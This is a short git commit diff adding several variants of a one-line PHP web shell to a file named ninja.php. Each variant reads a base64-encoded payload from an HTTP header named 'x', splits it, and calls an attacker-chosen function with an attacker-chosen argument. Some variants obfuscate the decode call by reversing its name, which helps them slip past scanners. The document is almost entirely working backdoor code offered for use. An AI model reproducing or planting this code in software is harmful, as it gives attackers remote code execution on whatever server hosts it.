81390b26dac8ffa9dcc03a24b774ab409ea1bfd6
Nick <nickmour5@gmail.com>
2018-06-04 15:11:02 +0300

    new versions

--- ninja.php
+++ ninja.php
@@ -1,1 +1,9 @@
+//short versions
+<?$x=explode('~',strrev('edoced_46esab')(substr(getallheaders()['x'],1)));@$x[0]($x[1]);
 <?$x=explode('~',base64_decode(substr(getallheaders()['x'],1)));@$x[0]($x[1]);
+<?$x=explode('~',strrev('edoced_46esab')(getallheaders()['x']));@$x[0]($x[1]);
+
+//full versions
+<?php$x=explode('~',strrev('edoced_46esab')(substr(getallheaders()['x'],1)));@$x[0]($x[1]);
+<?php$x=explode('~',base64_decode(substr(getallheaders()['x'],1)));@$x[0]($x[1]);
+<?php$x=explode('~',strrev('edoced_46esab')(getallheaders()['x']));@$x[0]($x[1]);
